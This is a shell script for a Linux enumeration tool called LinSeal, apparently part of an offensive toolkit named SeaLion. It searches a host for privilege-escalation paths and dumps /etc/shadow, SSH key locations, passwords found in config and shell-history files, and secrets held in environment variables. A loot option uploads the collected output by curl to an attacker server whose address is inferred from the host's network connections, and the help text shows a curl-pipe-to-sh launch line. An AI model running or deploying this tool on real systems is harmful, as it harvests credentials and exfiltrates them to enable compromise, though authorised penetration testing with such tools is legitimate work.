#!/bin/sh
# LinSeal — Lightweight Linux Enumeration (SeaLion)
# POSIX-compatible, no dependencies, no broken pipes
#
# Usage: linseal.sh [-o [file]] [-s] [-l] [-h]
#   -o [file]  Save output to file (default: output_N where N is first available)
#   -s         Silent mode — no terminal output, only write to file (requires -o)
#   -l         Also upload output to SeaLion loot via curl
#   -h         Show help

# ── Argument parsing ─────────────────────────────────────────

OUTFILE=""
SILENT=0
LOOT=0
LHOST=""

usage() {
  cat <<'USAGE'
LinSeal — Lightweight Linux Enumeration (SeaLion)

Usage: linseal.sh [OPTIONS]

Options:
  -o [file]   Save output to file. If no name given, uses output_<N>
  -s          Silent — suppress terminal output (implies -o)
  -l          Upload output to SeaLion /upload (loot)
  -h          Show this help

Environment:
  LHOST       SeaLion server address (auto-detected from /proc if possible)

Examples:
  ./linseal.sh                        # run, print to screen
  ./linseal.sh -o                     # run + save to output_1
  ./linseal.sh -o report.txt          # run + save to report.txt
  ./linseal.sh -o scan.txt -l         # run + save + upload to loot
  ./linseal.sh -o -s                  # save to output_N, no screen output
  ./linseal.sh -o -s -l               # save + upload, silent
  curl http://LHOST:2727/static/linseal.sh | sh -s -- -o -l
USAGE
  exit 0
}

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help) usage ;;
    -o)
      shift
      if [ $# -gt 0 ] && [ "${1#-}" = "$1" ] && [ -n "$1" ]; then
        OUTFILE="$1"
        shift
      else
        OUTFILE="__auto__"
      fi
      ;;
    -*)
      _flags=$(echo "$1" | sed 's/^-//')
      shift
      case "$_flags" in
        *o*)
          _rest=$(echo "$_flags" | sed 's/o//')
          case "$_rest" in *s*) SILENT=1 ;; esac
          case "$_rest" in *l*) LOOT=1 ;; esac
          if [ $# -gt 0 ] && [ "${1#-}" = "$1" ] && [ -n "$1" ]; then
            OUTFILE="$1"
            shift
          else
            OUTFILE="__auto__"
          fi
          ;;
        *)
          case "$_flags" in *s*) SILENT=1 ;; esac
          case "$_flags" in *l*) LOOT=1 ;; esac
          ;;
      esac
      ;;
    *) shift ;;
  esac
done

if [ "$OUTFILE" = "__auto__" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

if [ "$SILENT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

if [ "$LOOT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

# ── Auto-detect LHOST ────────────────────────────────────────

if [ -z "$LHOST" ]; then
  for f in /proc/net/tcp /proc/net/tcp6; do
    [ -r "$f" ] || continue
    _candidate=$(awk '$4 == "01" {split($2,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
    if [ -n "$_candidate" ]; then
      _hex="$_candidate"
      _a=$(printf "%d" "0x$(echo "$_hex" | cut -c7-8)" 2>/dev/null)
      _b=$(printf "%d" "0x$(echo "$_hex" | cut -c5-6)" 2>/dev/null)
      _c=$(printf "%d" "0x$(echo "$_hex" | cut -c3-4)" 2>/dev/null)
      _d=$(printf "%d" "0x$(echo "$_hex" | cut -c1-2)" 2>/dev/null)
      LHOST="$_a.$_b.$_c.$_d"
      break
    fi
  done
fi

# ── Output engine ────────────────────────────────────────────

_strip_colors() {
  sed 's/\x1b\[[0-9;]*m//g'
}

emit() {
  if [ -n "$OUTFILE" ] && [ "$SILENT" -eq 1 ]; then
    printf "%s\n" "$1" | _strip_colors >> "$OUTFILE"
  elif [ -n "$OUTFILE" ]; then
    printf "%s\n" "$1"
    printf "%s\n" "$1" | _strip_colors >> "$OUTFILE"
  else
    printf "%s\n" "$1"
  fi
}

emit_raw() {
  if [ -n "$OUTFILE" ] && [ "$SILENT" -eq 1 ]; then
    printf "%b\n" "$1" | _strip_colors >> "$OUTFILE"
  elif [ -n "$OUTFILE" ]; then
    printf "%b\n" "$1"
    printf "%b\n" "$1" | _strip_colors >> "$OUTFILE"
  else
    printf "%b\n" "$1"
  fi
}

# ── Colors ───────────────────────────────────────────────────
R='\033[1;31m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
B='\033[1;34m'
W='\033[1;37m'
N='\033[0m'

banner() {
  emit_raw ""
  emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
  emit_raw "${B}║${W}    LinSeal — Lightweight Linux Enumeration   ${B}║${N}"
  emit_raw "${B}║${G}              SeaLion Toolkit                 ${B}║${N}"
  emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
  emit_raw ""
}

section() {
  emit_raw ""
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw "${C}  $1${N}"
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw ""
}

hi()   { emit_raw "${R}[!] $1${N}"; }
warn() { emit_raw "${Y}[*] $1${N}"; }
info() { emit_raw "${G}[+] $1${N}"; }

run() {
  _out=$("$@" 2>/dev/null) || true
  if [ -n "$_out" ]; then
    emit "$_out"
  fi
}

# ── Init output file ────────────────────────────────────────

if [ -n "$OUTFILE" ]; then
  : > "$OUTFILE"
  if [ "$SILENT" -eq 0 ]; then
    printf "\033[1;32m[+] Output will be saved to: %s\033[0m\n" "$OUTFILE"
  fi
fi

# ══════════════════════════════════════════════════════════════
#                         SCAN START
# ══════════════════════════════════════════════════════════════

banner

# ── System Info ──────────────────────────────────────────────
section "SYSTEM INFO"

info "Hostname: $(hostname 2>/dev/null)"
info "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || uname -s)"
info "Kernel: $(uname -r)"
info "Arch: $(uname -m)"
info "Uptime: $(uptime 2>/dev/null | sed 's/.*up/up/' | sed 's/,.*user.*//')"

# ── Current User ─────────────────────────────────────────────
section "CURRENT USER"

info "User: $(whoami) (uid=$(id -u), gid=$(id -g))"
info "Groups: $(id -Gn 2>/dev/null || groups 2>/dev/null)"

if [ "$(id -u)" -eq 0 ]; then
  hi "RUNNING AS ROOT"
fi

for g in docker lxd adm sudo wheel disk video; do
  if id -Gn 2>/dev/null | grep -qw "$g"; then
    hi "Member of '$g' group — potential privesc vector"
  fi
done

# ── Sudo ─────────────────────────────────────────────────────
section "SUDO"

if command -v sudo >/dev/null 2>&1; then
  SUDO_OUT=$(sudo -l 2>/dev/null) || true
  if [ -n "$SUDO_OUT" ]; then
    emit "$SUDO_OUT"
    if echo "$SUDO_OUT" | grep -qi "NOPASSWD"; then
      hi "NOPASSWD entries found — check for privesc"
    fi
    if echo "$SUDO_OUT" | grep -qi "(ALL)"; then
      hi "Can run commands as ALL users"
    fi
    for cmd in env find vim nmap python perl ruby bash sh less more awk node php tar zip wget curl; do
      if echo "$SUDO_OUT" | grep -qw "$cmd"; then
        hi "sudo $cmd — GTFOBins candidate"
      fi
    done
  else
    warn "sudo -l requires password or is not allowed"
  fi
else
  info "sudo not installed"
fi

# ── SUID / SGID ─────────────────────────────────────────────
section "SUID BINARIES"

find / -perm -4000 -type f 2>/dev/null | while read -r f; do
  bn=$(basename "$f")
  case "$bn" in
    su|sudo|mount|umount|ping|passwd|chsh|chfn|newgrp|gpasswd|pkexec|crontab|at|fusermount*|ssh-keysign|pam_timestamp_check|unix_chkpwd|dbus-daemon-launch-helper)
      info "SUID: $f (standard)"
      ;;
    *)
      hi "SUID: $f — NON-STANDARD"
      ;;
  esac
done

section "SGID BINARIES"

find / -perm -2000 -type f 2>/dev/null | while read -r f; do
  bn=$(basename "$f")
  case "$bn" in
    wall|write|ssh-agent|crontab|expiry|chage|unix_chkpwd|locate|mlocate)
      info "SGID: $f (standard)"
      ;;
    *)
      warn "SGID: $f — non-standard"
      ;;
  esac
done

# ── Capabilities ─────────────────────────────────────────────
section "CAPABILITIES"

if command -v getcap >/dev/null 2>&1; then
  getcap -r / 2>/dev/null | while read -r line; do
    if echo "$line" | grep -qiE 'cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_net_raw'; then
      hi "CAP: $line"
    else
      warn "CAP: $line"
    fi
  done
else
  warn "getcap not available"
fi

# ── Writable dirs / files ───────────────────────────────────
section "WRITABLE INTERESTING FILES"

for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts /etc/ssh/sshd_config; do
  if [ -w "$f" ] 2>/dev/null; then
    hi "WRITABLE: $f"
  fi
done

for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /etc/sudoers.d; do
  if [ -d "$d" ] && [ -w "$d" ] 2>/dev/null; then
    hi "WRITABLE DIR: $d"
  fi
done

# ── Cron ─────────────────────────────────────────────────────
section "CRON JOBS"

for f in /etc/crontab /etc/cron.d/*; do
  if [ -r "$f" ] 2>/dev/null; then
    emit_raw "${W}--- $f ---${N}"
    run cat "$f"
  fi
done

emit_raw "\n${W}--- User crontab ---${N}"
_ucron=$(crontab -l 2>/dev/null) || true
if [ -n "$_ucron" ]; then
  emit "$_ucron"
else
  info "No user crontab"
fi

grep -rhE '^[^#].*/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oE '/[^ ]+' | sort -u | while read -r s; do
  if [ -f "$s" ] && [ -w "$s" ]; then
    hi "WRITABLE cron script: $s"
  fi
done

# ── Timers ───────────────────────────────────────────────────
section "SYSTEMD TIMERS"

if command -v systemctl >/dev/null 2>&1; then
  run systemctl list-timers --no-pager
fi

# ── Processes ────────────────────────────────────────────────
section "RUNNING PROCESSES (interesting)"

ps aux 2>/dev/null | grep -vE '^\[|grep|ps aux' | while read -r line; do
  puser=$(echo "$line" | awk '{print $1}')
  proc=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf "%s ", $i; print ""}')
  if [ "$puser" = "root" ]; then
    for kw in python perl ruby node php apache nginx mysql postgres docker; do
      if echo "$proc" | grep -qi "$kw"; then
        warn "root: $proc"
        break
      fi
    done
  fi
done

emit_raw "\n${W}--- All processes ---${N}"
run ps aux

# ── Network ──────────────────────────────────────────────────
section "NETWORK — LISTENING PORTS"

if command -v ss >/dev/null 2>&1; then
  run ss -tlnp
elif command -v netstat >/dev/null 2>&1; then
  run netstat -tlnp
fi

emit_raw "\n${W}--- All connections ---${N}"
if command -v ss >/dev/null 2>&1; then
  run ss -tanp
elif command -v netstat >/dev/null 2>&1; then
  run netstat -tanp
fi

section "NETWORK — INTERFACES"
if command -v ip >/dev/null 2>&1; then
  run ip addr
else
  run ifconfig
fi

section "NETWORK — ROUTES"
if command -v ip >/dev/null 2>&1; then
  run ip route
else
  run route -n
fi

section "NETWORK — ARP"
if command -v ip >/dev/null 2>&1; then
  run ip neigh
else
  run arp -a
fi

# ── Interesting files ────────────────────────────────────────
section "INTERESTING FILES"

info "Looking for passwords/keys in common locations..."

for f in /etc/shadow /etc/master.passwd; do
  if [ -r "$f" ]; then
    hi "READABLE: $f"
    run cat "$f"
  fi
done

emit_raw "\n${W}--- SSH keys ---${N}"
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null | while read -r f; do
  if [ -r "$f" ]; then
    hi "FOUND: $f"
    _ls=$(ls -la "$f" 2>/dev/null) || true
    [ -n "$_ls" ] && emit "$_ls"
  fi
done

emit_raw "\n${W}--- Config files with passwords ---${N}"
for f in /var/www /opt /home /srv /etc; do
  find "$f" -maxdepth 4 -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name ".env" -o -name "wp-config.php" -o -name "config.php" -o -name "database.yml" -o -name "settings.py" -o -name "*.properties" \) -readable 2>/dev/null | while read -r c; do
    _matches=$(grep -inE 'passw|secret|key.*=|token|credentials' "$c" 2>/dev/null | head -5) || true
    if [ -n "$_matches" ]; then
      hi "PASSWORDS in: $c"
      emit "$_matches"
      emit_raw ""
    fi
  done
done

emit_raw "\n${W}--- History files ---${N}"
for f in /home/*/.bash_history /home/*/.zsh_history /root/.bash_history /home/*/.mysql_history /home/*/.psql_history; do
  if [ -r "$f" ] 2>/dev/null; then
    hi "READABLE: $f"
    _wc=$(wc -l < "$f" 2>/dev/null) || true
    [ -n "$_wc" ] && info "$f: $_wc lines"
    _hgrep=$(grep -iE 'passw|secret|token|key|mysql.*-p|sudo|su |ssh ' "$f" 2>/dev/null | head -10) || true
    [ -n "$_hgrep" ] && emit "$_hgrep"
  fi
done

emit_raw "\n${W}--- Backup files ---${N}"
find / -maxdepth 4 -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*.orig" -o -name "*backup*" -o -name "*.sql" -o -name "*.db" -o -name "*.sqlite" \) -readable 2>/dev/null | head -20 | while read -r f; do
  warn "BACKUP: $f"
done

# ── /etc/passwd ──────────────────────────────────────────────
section "USERS"

info "Users with shell:"
_shells=$(grep -E '/bin/(ba)?sh$|/bin/zsh$|/bin/fish$' /etc/passwd 2>/dev/null) || true
[ -n "$_shells" ] && emit "$_shells"

info "Users with UID 0:"
awk -F: '$3 == 0 {print}' /etc/passwd 2>/dev/null | while read -r line; do
  if ! echo "$line" | grep -q '^root:'; then
    hi "NON-ROOT UID 0: $line"
  else
    info "$line"
  fi
done

# ── Home dirs ────────────────────────────────────────────────
section "HOME DIRECTORIES"

run ls -la /home/
for d in /home/*; do
  [ -d "$d" ] || continue
  if [ -r "$d" ]; then
    emit_raw "\n${W}--- $d ---${N}"
    run ls -la "$d"
  fi
done

# ── Docker / LXD ─────────────────────────────────────────────
section "CONTAINERS"

if command -v docker >/dev/null 2>&1; then
  warn "Docker installed"
  run docker ps -a
  run docker images
  if [ -w /var/run/docker.sock ]; then
    hi "docker.sock is WRITABLE — container escape possible"
  fi
fi

if command -v lxc >/dev/null 2>&1; then
  warn "LXC/LXD installed"
  run lxc list
fi

# ── Mounted filesystems ─────────────────────────────────────
section "MOUNTS"

mount 2>/dev/null | while read -r line; do
  if echo "$line" | grep -qE 'nosuid|noexec'; then
    info "$line"
  else
    emit "$line"
  fi
done

emit_raw "\n${W}--- /etc/fstab ---${N}"
run cat /etc/fstab

# ── Disk ─────────────────────────────────────────────────────
section "DISK USAGE"
run df -h

# ── Kernel exploits ──────────────────────────────────────────
section "KERNEL INFO"

KERN=$(uname -r)
info "Kernel: $KERN"

KERN_MAJ=$(echo "$KERN" | cut -d. -f1)
KERN_MIN=$(echo "$KERN" | cut -d. -f2)

if [ "$KERN_MAJ" -lt 4 ] 2>/dev/null; then
  hi "Old kernel ($KERN) — likely vulnerable to known exploits"
elif [ "$KERN_MAJ" -eq 4 ] && [ "$KERN_MIN" -lt 15 ] 2>/dev/null; then
  warn "Kernel $KERN — check for known exploits"
fi

if [ -f /proc/version ]; then
  info "Version: $(cat /proc/version)"
fi

# ── Environment ──────────────────────────────────────────────
section "ENVIRONMENT"

env 2>/dev/null | grep -iE 'pass|key|secret|token|api|cred|database|db_|mysql|postgres' | while read -r line; do
  hi "ENV: $line"
done

info "PATH: $PATH"

# ══════════════════════════════════════════════════════════════
#                         SCAN COMPLETE
# ══════════════════════════════════════════════════════════════

emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${G}          LinSeal scan complete                ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""
emit_raw "${Y}[!] = Critical   ${G}[+] = Info   ${Y}[*] = Interesting${N}"
emit_raw ""

# ── Post-scan: summary ──────────────────────────────────────

if [ -n "$OUTFILE" ]; then
  _lines=$(wc -l < "$OUTFILE" 2>/dev/null || echo "?")
  printf "\033[1;32m[+] Output saved to: %s (%s lines)\033[0m\n" "$OUTFILE" "$_lines"
fi

# ── Post-scan: upload to loot ────────────────────────────────

if [ "$LOOT" -eq 1 ] && [ -n "$OUTFILE" ]; then
  _lname=$(basename "$OUTFILE")
  _uploaded=0

  if [ -n "$LHOST" ]; then
    for _port in 2727 8080 8000 80; do
      if curl -sf -m 3 -F "file=@${OUTFILE}" "http://${LHOST}:${_port}/upload" >/dev/null 2>&1; then
        printf "\033[1;32m[+] Uploaded to loot: http://%s:%s/upload (%s)\033[0m\n" "$LHOST" "$_port" "$_lname"
        _uploaded=1
        break
      fi
    done
  fi

  if [ "$_uploaded" -eq 0 ]; then
    printf "\033[1;33m[*] Loot upload failed — could not reach SeaLion server\033[0m\n"
    if [ -z "$LHOST" ]; then
      printf "\033[1;33m[*] Set LHOST manually: LHOST=<ip> ./linseal.sh -o -l\033[0m\n"
    fi
  fi
elif [ "$LOOT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  printf "\033[1;33m[*] -l requires -o (need a file to upload)\033[0m\n"
fi

# ── Notify in shell ──────────────────────────────────────────
if [ "$SILENT" -eq 1 ]; then
  printf "\033[1;32m[+] LinSeal scan complete.\033[0m"
  [ -n "$OUTFILE" ] && printf " \033[1;32mOutput: %s\033[0m" "$OUTFILE"
  printf "\n"
fi
